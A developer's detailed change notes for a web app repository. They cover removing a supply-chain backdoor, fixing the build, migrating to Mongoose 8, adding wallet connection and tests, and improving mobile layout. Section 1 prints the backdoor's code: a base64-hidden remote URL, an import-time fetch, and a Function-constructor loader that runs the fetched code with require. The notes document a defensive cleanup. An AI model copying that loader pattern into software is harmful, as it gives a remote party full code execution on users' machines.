# Detailed change notes

Everything I touched and why. [SUMMARY.md](./SUMMARY.md) is the short version; this is the long one,
written as I went. Branch `solution`, off `bb58a11 initial commit`.

---

## 1. The backdoor

Three files formed a chain.

`server/config/config.js` exported `publicKey`, a base64 blob decoding to
`https://api.jsonstorage.net/v1/json/2ef8c758-a96f-459e-b036-b3b90379a165/f89e8264-86c2-4684-94da-c3f82d59370f`.

`server/controllers/auth.controller.js` ran this at import time, not inside a handler, so importing the
module was enough to trigger it:

```js
axios.get(atob(publicKey)).then(res => errorHandler(res.data.cookie));
```

`server/middleware/errorHandler.js` was named like error handling and wasn't. It compiled the downloaded
string into a function and called it with `require` passed in:

```js
const handler = new Function.constructor("require", errCode);
handlerFunc(require);
```

`npm start` therefore meant: GET a third-party JSON document, compile its contents, execute with full
Node privileges.

What I changed:

- `errorHandler.js` became an actual Express error middleware. This was the execution primitive, so it
  went first.
- `auth.controller.js` lost the import-time call and the now-unused `axios`, `publicKey` and
  `errorHandler` imports.
- `config.js` lost `publicKey` entirely, and `secretKey` moved to `process.env.JWT_SECRET` with a
  dev fallback. A signing key committed to a repo is its own problem.
- `providers/token.provider.js` deleted. Nothing imported it, and it signed a dummy JWT with `RS256`
  against an HMAC secret at import time, which is both broken and an unnecessary side effect.

Nothing was ever fetched: `node_modules/` didn't exist yet and I never started the server.

---

## 2. Getting it to build and boot

### The frontend build was dead

Tailwind was not installed. `postcss.config.js` referenced it and CRA 5 enables it automatically when
`tailwind.config.js` is present, so the build tried to `require('tailwindcss')` and failed — meaning not
one utility class compiled. Added `tailwindcss@^3.4.4`, `autoprefixer` and `postcss`.

It has to be v3, not v4: v4 renames the PostCSS plugin to `@tailwindcss/postcss` and drops this config
format, and CRA 5 hardcodes `require('tailwindcss')`, so v4 can't work without ejecting.

`tailwind.config.js` also used `export default` in a file CRA loads with `require()`, and its content glob
pointed at `./index.html`, which doesn't exist (the file is in `public/`). Both fixed.

Two smaller things: `public/index.html` had a leftover Vite `<script type="module" src="/src/main.jsx">`
that 404s under CRA, and `src/App.css` was sitting unimported with
`#root { max-width: 1280px; padding: 2rem; text-align: center }` in it. Deleted, because that file is one
`import` away from breaking mobile layout entirely.

Later, while verifying the build, a second blocker appeared. The repo has no `package-lock.json`, so a
fresh install resolves `typescript@7.0.2`. `@typescript-eslint@5` (pulled in by `eslint-config-react-app`)
reads `ts.TypeFlags` at module load and TS 7 no longer exposes it that way, so `eslint-plugin-jest` fails
to load and the build dies with `Environment key "jest/globals" is unknown`. npm even marks it
`invalid: "^3.2.1 || ^4"` and installs it anyway. Pinned `typescript@^4.9.5` and committed the lockfile,
which is the real fix — without one, every clone gets a different tree.

### The backend couldn't be tested and didn't parse bodies

Split `server/app.js` into an app that gets exported and a `server/index.js` that connects Mongo and
listens. Supertest needs an app it can drive without binding a port.

`express.json()` and `express.urlencoded()` were both commented out, so `req.body` was `undefined` in
every POST and PUT handler in the project. Uncommented. `notFound` and `errorHandler` existed but were
never mounted; they are now, at the end.

The Mongo connect was commented out too. `server/index.js` connects, and catches failure so the API still
boots without a local database — otherwise the frontend has nothing to talk to.

`routes/property.js` called `new mongoose.mongo.GridFsStorage(...)` inside a connection handler. That class
doesn't exist on the driver, so it threw the moment Mongo connected. Replaced with a shared
`GridFSBucket` provider in `server/providers/gridfs.js`, and dropped the `gridfs-stream` dependency, which
targets driver 2.x and can't work with Mongoose 8.

Also removed the unused `body-parser`, `morgan` and `http` requires. `body-parser` wasn't even a declared
dependency; it only resolved because express happens to ship it.

### Mongoose 8 migration

Mongoose 7 removed callbacks from queries. Every controller used them, which means every database-backed
route threw before returning a response. All four moved to async/await with `try/catch` and `next(err)`.

The bugs that surfaced on the way:

| File | What was wrong |
|---|---|
| `common.controller.js` | `if (err) res.status(400).send(err)` with no `else`, then the success response — two responses on the error path, so `ERR_HTTP_HEADERS_SENT` |
| `common.controller.js` | `city_model.remove()`, removed in v7. Now `deleteOne()` with a 404 when nothing matched |
| `common.controller.js` | `checkemailAvailability` loaded whole user documents to answer a yes/no. Now `users.exists()` |
| `auth.controller.js` | `users.lname = req.body.lName`. `lname` is required, so **every registration failed validation** |
| `auth.controller.js` | `users = new userM()` with no declaration — an implicit global shared across concurrent requests |
| `auth.controller.js` | `Invalid Credentials1` vs `Invalid Credentials2` told you whether an account existed |
| `auth.controller.js` | `req.body.emailPhone != ""` threw when no body was sent |
| `auth.controller.js` | JWT had no expiry; `userList` returned password hashes to anyone |
| `property.controller.js` | `Property.update()` (removed in v7) plus `result.nModified` (renamed in v6). **`markAsSold` was broken in both halves and could never have worked** |
| `property.controller.js` | unknown slug threw and came back 400; now 404 |
| `property.controller.js` | `.populate('userId', 'name')` — the users schema has no `name` field |
| `users.controller.js` | malformed id threw an uncaught CastError; a missing user returned 200 with an empty body; the response included the password hash |
| `providers/helper.js` | `for (element of ...)` with no declaration, another implicit global |
| three models | `default: Date.now()` is called once at module load, so every document shared the server's boot time. Needs `Date.now` |
| `models/propertyTypes.js`, `models/users.js` | schema variables declared without `const` |
| `routes/{auth,users,common}.js` | a stray `var app = express()` in each, creating three entire unused Express apps |
| `routes/email.js` | `res.status(400).send(err)` shipped the raw SendGrid error object, headers and all, to the client |

Also deleted `testController`, an unrouted leftover with a hardcoded 2019 date filter.

---

## 3. Wallet connection

The Connect button appeared three times with no handler: `Navbar.jsx` desktop, `Navbar.jsx` mobile, and
the CTA in `Home.jsx`. Because the address needs to appear in all three, this is context, not a hook per
component. `src/context/WalletContext.jsx` holds the state; `src/components/wallet/ConnectWalletButton.jsx`
is the single control all three sites render.

Provider detection prefers `window.ethereum.providers.find(p => p.isMetaMask)` over
`window.ethereum.isMetaMask`, because with several wallet extensions installed the winner of
`window.ethereum` may not be MetaMask. A non-MetaMask provider is reported as "not installed" rather than
driven blindly.

Errors map from EIP-1193 codes: `4001` to "Connection request rejected", `-32002` to "a request is already
pending", no provider to a message plus an install link, anything else to the provider's own message.
They render in a `role="alert"` node and the button carries `aria-busy` while in flight.

Beyond the brief, a silent `eth_accounts` call on mount restores an already-authorised account across
refreshes without triggering the popup, with a test asserting `eth_requestAccounts` is never called on
that path.

While setting this up I found `src/setupTests.js` was missing. `@testing-library/jest-dom` was already a
dependency but was never registered, so **none of its matchers existed** — `toHaveTextContent` and friends
silently weren't functions. Created it.

`src/test-utils/interactions.js` exists because this project pins `@testing-library/user-event@^13`, where
`click()` is synchronous, so awaiting it doesn't flush the promise chain the async state updates depend on
and React logs "not wrapped in act(...)" for every test. The helper wraps the click in an async `act`. v14
made click async and this wouldn't be needed; bumping the dependency felt out of scope.

---

## 4. Responsiveness

Most of this task was the toolchain (section 2). Once Tailwind actually compiled, the layout work in
`src/pages/Home.jsx`:

- Hero `h-[600px]` became `min-h-[520px] sm:min-h-[600px] py-16`. A fixed height can't grow with its
  content, and the headline wraps to three lines at 375px.
- Responsive steps added to the hero paragraph, the six section headings, the root spacing, five grid gaps
  and the blog block's padding.
- The property price/ROI row got `gap-4` and `min-w-0`; the two columns touched at around 360px.
- The Discord section used its own `max-w-7xl mx-auto px-4 sm:px-6 lg:px-8` instead of the project's
  `.container`, so its gutters didn't match anything else.
- FAQ toggles got `aria-expanded` and `type="button"`; six below-fold images got `loading="lazy"`.

In `src/components/layout/Navbar.jsx`: the brand truncates and scales, the links tighten between 768px and
about 900px (the one range where the desktop nav is active but overflowing), the hamburger gained
`aria-label`, `aria-expanded`, `aria-controls` and a 44px tap target, and the mobile Connect button is
full-width rather than a stray `w-auto`.

Measured in same-origin iframes, which get their own viewport for media queries:

| Viewport | Horizontal overflow | Hamburger | First grid |
|---|---|---|---|
| 375 × 667 | none (360 ≤ 375) | shown | 1 column |
| 390 × 844 | none (375 ≤ 390) | shown | 1 column |
| 768 × 1024 | none (753 ≤ 768) | hidden | 2 columns |
| 1440 × 900 | none (1425 ≤ 1440) | hidden | 4 columns |

Zero elements wider than the viewport at any size.

**One thing I got wrong and reverted.** The hero headline looked nearly invisible in my screenshots, and I
darkened `.glass-hero` from `40/30/20` to `75/65/60` to "fix contrast". That was wrong. The tab was in a
background window, so `requestAnimationFrame` was throttled and framer-motion's entrance animations were
frozen mid-fade — the h1 measured `opacity: 0.277` and the paragraph `0`. Forcing the animations to their
end state showed the original scrim was perfectly readable. Reverted; no contrast change ships. I kept the
`p-6 sm:p-8` padding fix because it stands on its own.

---

## 5. Backend tests

There were none to review. `find . -name "*.test.js"` at the initial commit returned nothing, and there
was no test script or test dependency either.

`jest.server.config.js` keeps the backend suite separate from the CRA runner that owns `src/`.
`server/__tests__/setup.js` starts an in-memory Mongo, empties every collection between tests, and mocks
`@sendgrid/mail` globally so no suite can make a real API call. Collections are emptied rather than
dropped, because dropping would take the unique indexes with them and the duplicate-registration tests
depend on those. Factory defaults are counter-suffixed for the same reason: `state.name`, `city.name`,
`users.email` and `users.phoneNo` are all unique, so calling a factory twice would otherwise fail on a
duplicate key instead of on the thing under test.

91 tests over 7 files: health (5), auth (19), common (15), property (25), users (4), email (7 including a
5-case `it.each`), helper (12).

The ones that exist to pin a specific bug:

- **`markAsSold` updates the status.** Verified this bites — putting `result.nModified` back turns exactly
  one test red and leaves the other 24 green.
- **Registration persists the surname**, for the `lName` typo.
- **Stored passwords are bcrypt hashes**, checked by prefix and round-tripped through `bcrypt.compare`.
- **Unknown user and wrong password return byte-identical responses.**
- **A duplicate state name sends exactly one response**, for the missing `else`.
- **Slug collisions increment**: `luxury-villa`, `-1`, `-2`, plus a gap case.
- **`userList` and `GET /api/user/:id` omit the password hash.**
- **SendGrid failures return `{message}`**, not the provider's raw error object.

Writing these surfaced one more fix. Unique-index violations were coming back as 500 with a stack trace on
stderr, so `errorHandler` now maps `err.code === 11000` to 409 centrally and only logs genuine 5xx. My
first attempt used `Math.min(rawStatus, 400)`, which also downgraded the 404 — caught by the health suite.

Coverage: 91.74% statements, 84.49% branches, 97.05% functions.

---

## 6. A bug found in the browser, not in jsdom

Driving the real page in Chrome — injecting a provider *after* React had mounted, then emitting
`accountsChanged` — exposed something the unit tests couldn't, because they set `window.ethereum` before
rendering.

The listener effect read the provider once at mount and returned early if it was absent. MetaMask usually
injects before React mounts, but when it doesn't, the listeners were never attached and every account
switch was silently ignored for the lifetime of the page. Connecting still worked, because `connect()`
re-resolves the provider, which is exactly what made it invisible.

The provider is now held in state, `connect()` publishes a late-resolved one, and both effects depend on
it. Regression test added; restoring `}, []);` on the listener effect turns it red.

---

## 7. Error tooltip

The connection error was plain red text under the button, which also reflowed the navbar row when it
appeared. Replaced with an anchored popover: dark panel, arrow, alert icon, dismiss button, fade and scale
in, Escape to close. Positioned absolutely so it never shifts layout, and `role="alert"` retained so this
isn't an accessibility regression. It takes an alignment prop because the navbar button sits against the
right gutter and a centred panel would hang off-screen there.

Building it caught another real bug: the tooltip said "MetaMask is not installed" *without* the install
link. `hasProvider` came from the provider captured at mount, so if the extension was there at mount and
gone by click time, the UI claimed MetaMask was missing while withholding the link that fixes it.
`connect()` now clears the cached provider on that path.

Verified against real MetaMask: connect, approval prompt, address in both the navbar and the CTA; a reload
restored the account silently via `eth_accounts` with no popup; disconnect cleared both.

---

## 8. Native mobile pass

Four things after seeing it running.

**The menu is an overlay now.** It rendered inside the nav's flow, so opening it grew the navbar and
pushed the page down. It's `position: absolute` with a dimmed backdrop, plus Escape to close, body scroll
lock, and auto-close on route change. Measured: the hero stays at `top: 65px` whether it's open or closed.
The panel is full-bleed and fully opaque — at `bg-white/95` the dark hero card showed through and the
links were hard to read, and the `.container` wrapper was insetting it 16px per side.

**Cards go flat on phones.** Below `sm`, `.card` is full-bleed with no rounding, no shadow and hairline
separators, so listings read as a native list. Added `.flat-on-mobile` as an opt-in companion for the
large `glass-card` panels — opt-in rather than baked into `.glass-card`, because that class is also used
for the "Active Investment" pill and the 3D-viewer icon buttons, which need to keep their rounding.
`.card` was safe to change directly since only the two property cards use it.

**No hover on touch.** Rather than prefixing dozens of utilities with `sm:`, I turned on Tailwind's
`hoverOnlyWhenSupported`, which compiles every `hover:` variant inside
`@media (hover: hover) and (pointer: fine)`. Confirmed in the built CSS that `.card:hover`,
`.group-hover:scale-105/110` and `.btn:hover` all landed inside that gate, so a tap can't leave an element
stuck in its hover state.

**One entrance animation instead of five.** The grids each had their own `delay: index * 0.2` with default
easing. Now one shared `riseIn(index)`: `ease: [0.22, 1, 0.36, 1]`, 0.09s stagger, 0.7s duration, 28px
offset, `amount: 0.15` so a card starts moving as it enters rather than after.

| | 390px | 1280px |
|---|---|---|
| Card radius | 0 | 32px |
| Card shadow | none | yes |
| Card left edge | 0 (full bleed) | 32px (inset) |
| Horizontal overflow | none | none |

---

## 9. The rest of the pages

Task 2 named the homepage, so that is where I stopped initially. Going back over the other routes turned
up the same problems, so they got the same treatment.

Ten headings sat at a bare `text-3xl` or `text-4xl` with no mobile step: `About` (x6, including the h1),
`FAQ`, `Privacy`, `Blog`, `BlogPost`, `Properties` and `NotFound`. At 320px a bold 36px heading eats most
of the screen. Now `text-2xl sm:text-3xl` and `text-3xl sm:text-4xl`, matching what the homepage already
did. The two that already carried `md:text-5xl` kept it and gained the missing lower step.

Section padding (`py-16`, one `py-24`) and fourteen `gap-8` grid gutters got mobile steps for the same
reason. The `Footer` grid too, since it renders on every page.

**`BlogPost`'s hero was a genuine bug, and I briefly made it worse.** It used a fixed `h-[400px]` with the
title absolutely positioned over it. On a phone the five-line title plus the byline is taller than the
band, so the copy spilled past the dark scrim onto the light page background and the grey byline became
unreadable against the photo. My first pass shortened it to `h-[240px]`, which made the overflow worse
rather than fixing it — the fixed height was the problem, not its value. The real fix is the pattern the
homepage hero already uses: `min-h-*` with the image and scrim `absolute inset-0`, so the band grows to
whatever the copy needs. Measured afterwards: the hero renders 416px tall at 360px wide, the scrim
matches it exactly, and the byline sits inside both. The byline row also got `flex-wrap` with `gap-x/gap-y`
instead of `space-x-6`, so three metadata items wrap instead of squeezing.

Two things I looked at and deliberately left. `PropertyDetail`'s `grid-cols-3` has no breakpoint, but it
is a thumbnail strip — about 93px per image at 320px, which is what you want. And one `text-4xl` in
`Home.jsx` sizes a react-icon, not a heading.

Verified across every route (`/`, `/properties`, `/properties/1`, `/about`, `/faq`, `/privacy`, `/blog`,
a blog post, and a 404) at 320, 375, 768 and 1440: no horizontal overflow and zero over-wide elements
anywhere. Largest heading now renders 24-30px on a phone against 30-48px on desktop, where several pages
were previously locked at 36px regardless of width.

---

## 10. Constants

A cleanup pass. One rule: name a value if it's repeated, or if it has to match a value written somewhere
else. Everything else stays inline, because extracting one-off strings adds indirection and buys nothing.

**`src/constants/ethereum.js`** is the one that fixes a real bug class. `'accountsChanged'` and
`'chainChanged'` were each written twice, once to subscribe and once to unsubscribe. A typo in either
cleanup string leaks the listener and nothing fails. RPC method names were repeated too, and the EIP-1193
codes were bare numbers (`4001`, `-32002`) that mean nothing without a spec open.

**`server/constants/messages.js`** is imported by controllers *and* tests. Before, every message existed
twice: once in the handler, once re-typed as a string assertion in the spec. Changing wording meant
hunting for the copy, and a mismatch showed up as a confusing failure rather than a compile error.

**`server/constants/httpStatus.js`** replaces 43 raw status codes, so a handler reads as `CONFLICT`
instead of `409`.

**`server/constants/domain.js`** holds the schema enums. The models now derive `enum` from
`Object.values(...)`, so `models/property.js` and the tests can't drift apart.

Deliberately left inline: one-off log text, Tailwind class strings, test fixture values, and the route
paths in routers — a router *is* the definition of its path, so a constant would only add a hop.

Also normalised `auth.controller.js` to single quotes (it was the only server file using double, 48 of
them) and added `.env.example`, since the app reads six environment variables and documented none.

No behaviour change: 91 backend and 21 frontend tests still pass, the build compiles, and an API smoke
test returns byte-identical responses.

---

## Found but not fixed

None of these are on a path the assessment exercises, and each would have been scope creep. Listed so
nothing looks overlooked.

**No authentication on the admin routes.** `GET /api/auth/admin/userList` and `PUT /admin/changePass` are
named "admin" and have no middleware — anyone can list users or reset any password, and the JWT login
issues is never verified again. This is a genuine hole. I left it because adding auth is a feature rather
than a fix and changes the contract the frontend is written against. It's the first thing I'd do next.

**Uploads never reach GridFS.** `addNewProperty` reads `file.filename`, which Multer's memory storage
doesn't set, so `images` is always `[]`. Wiring the upload pipeline is a feature.

**The frontend never calls the API.** Every page is static mock data. This is why a completely
non-functional backend was invisible in the UI, and why nobody noticed registration had never worked.

**`@testing-library/react@13` with React 18.3** logs a `ReactDOMTestUtils.act is deprecated` warning from
the library's own internals on every render. Harmless, and only fixable with a major dependency bump.

**Unused dependencies** remain: `morgan`, `@walletconnect/web3-provider`, `paytmchecksum` and others. I
only removed `gridfs-stream`, because it actively broke.

## Decisions you could reasonably overrule

1. Creation endpoints return **201 instead of 200** (`POST /state`, `/cities`, `/property/type`,
   `/property/new`, `/user/register`). Correct REST, nothing consumes them, but it is a contract change.
2. **Raw EIP-1193 instead of the bundled `ethers@5`.** Nothing signs or reads balances here.
3. **`checkemailAvailability` uses `users.exists()`** rather than loading documents. Same response shape.
4. **Duplicate registration returns 409**, not the original 400.
5. **`secretKey` moved to `process.env.JWT_SECRET`** with an obviously-insecure dev fallback, so the repo
   no longer ships a usable signing key.

## A note on the test harness

Two things confused my own verification for a while, both caused by Chrome throttling
`requestAnimationFrame` to zero in a background tab. Framer-motion animations froze mid-fade, which made
screenshots look like contrast bugs, and programmatic iframe scrolling silently did nothing because
`html { scroll-behavior: smooth }` needs rAF to progress. Overriding to `scroll-behavior: auto` fixed the
second. Neither affects real users; it just meant some of my earlier visual checks were less informative
than they looked.
